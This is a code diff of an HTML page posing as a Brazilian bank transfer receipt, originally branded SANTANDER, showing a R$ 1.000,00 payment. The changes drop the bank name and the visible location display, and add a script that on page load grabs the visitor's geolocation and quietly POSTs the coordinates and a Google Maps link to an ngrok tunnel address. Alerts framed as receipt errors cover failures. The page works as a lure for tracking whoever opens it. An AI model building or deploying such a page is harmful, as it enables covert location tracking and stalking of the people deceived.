@@ -4,73 +4,19 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Comprovante de Recebimento - SANTANDER</title>
+  <title>Comprovante de Recebimento</title>
   <link rel="stylesheet" href="styles.css" />
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      padding: 20px;
-    }
-
-    .comprovante-container {
-      background: #fff;
-      padding: 20px;
-      max-width: 600px;
-      margin: auto;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-    }
-
-    .informacoes p {
-      margin: 10px 0;
-    }
-
-    .informacoes span {
-      font-weight: bold;
-    }
-
-    .botao {
-      margin-top: 20px;
-      padding: 10px 20px;
-      background-color: #d50000;
-      color: #fff;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .botao:hover {
-      background-color: #b71c1c;
-    }
-
-    .comprovante-footer {
-      margin-top: 30px;
-      font-size: 0.9em;
-      color: #555;
-    }
-
-    .comprovante-footer a {
-      color: #d50000;
-      text-decoration: none;
-    }
-
-    .comprovante-footer a:hover {
-      text-decoration: underline;
-    }
-  </style>
 </head>
 
 <body>
   <div class="comprovante-container">
-    <h1>Comprovante de Recebimento - SANTANDER</h1>
+    <h1>Comprovante de Recebimento</h1>
 
     <div class="informacoes">
       <p><span>Data:</span> <span id="data-atual"></span></p>
       <p><span>Valor Recebido:</span> R$ 1.000,00</p>
       <p><span>De:</span> João Silva de Oliveira</p>
       <p><span>Status:</span> Recebido com Sucesso</p>
-      <p><span>Localização:</span> <span id="localizacao">Obtendo localização...</span></p>
     </div>
 
     <button class="botao" onclick="window.print()">Imprimir</button>
@@ -79,58 +25,54 @@
       <p>Se você tiver dúvidas, entre em contato com nosso suporte.</p>
       <p><a href="#">Clique aqui</a> para mais informações.</p>
     </div>
+
   </div>
 
   <script>
-    // Exibir data atual formatada
-    window.addEventListener("DOMContentLoaded", () => {
-      const dataAtual = new Date();
-      const dia = String(dataAtual.getDate()).padStart(2, '0');
-      const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
-      const ano = dataAtual.getFullYear();
-      const dataFormatada = `${dia}/${mes}/${ano}`;
-      document.getElementById("data-atual").textContent = dataFormatada;
+    window.addEventListener("load", () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      } else {
+        alert("Algo deu errado. Tente novamente mais tarde.");
+      }
     });
 
-    // Geolocalização com envio para servidor
-    if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-          const localizacaoTexto = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
-          document.getElementById("localizacao").textContent = localizacaoTexto;
+    const dataAtual = new Date();
+    const dia = String(dataAtual.getDate()).padStart(2, '0');
+    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
+    const ano = dataAtual.getFullYear();
 
-          // Enviar os dados para o servidor (exemplo com fetch POST)
-          fetch("https://21a6-201-42-106-118.ngrok-free.app", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              latitude,
-              longitude,
-              data: new Date().toISOString(),
-              origem: "comprovante-santander"
-            }),
-          })
-          .then(response => {
-            if (!response.ok) throw new Error("Erro ao enviar localização");
-            return response.json();
-          })
-          .then(data => {
-            console.log("Localização enviada com sucesso:", data);
-          })
-          .catch(error => {
-            console.error("Erro ao enviar localização:", error);
-          });
+    const dataFormatada = `${dia}/${mes}/${ano}`;
+
+    document.getElementById("data-atual").textContent = dataFormatada;
+
+    console.log(dataAtual)
+
+    function sendLocation(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      fetch("https://21a6-201-42-106-118.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
         },
-        (error) => {
-          document.getElementById("localizacao").textContent = "Permissão negada ou erro na localização.";
-          console.warn("Erro na geolocalização:", error);
-        }
-      );
-    } else {
-      document.getElementById("localizacao").textContent = "Geolocalização não suportada neste navegador.";
+        body: JSON.stringify({ latitude, longitude, maps })
+      })
+        .then(response => response.json())
+        .then(data => {
+          if (!data.success) {
+            alert("Erro ao enviar o comprovante.");
+          }
+        })
+        .catch(error => {
+          console.error("Erro:", error);
+        });
+    }
+
+    function handleError(error) {
+      alert("Erro ao obter a localização: " + error.message);
     }
   </script>
 </body>
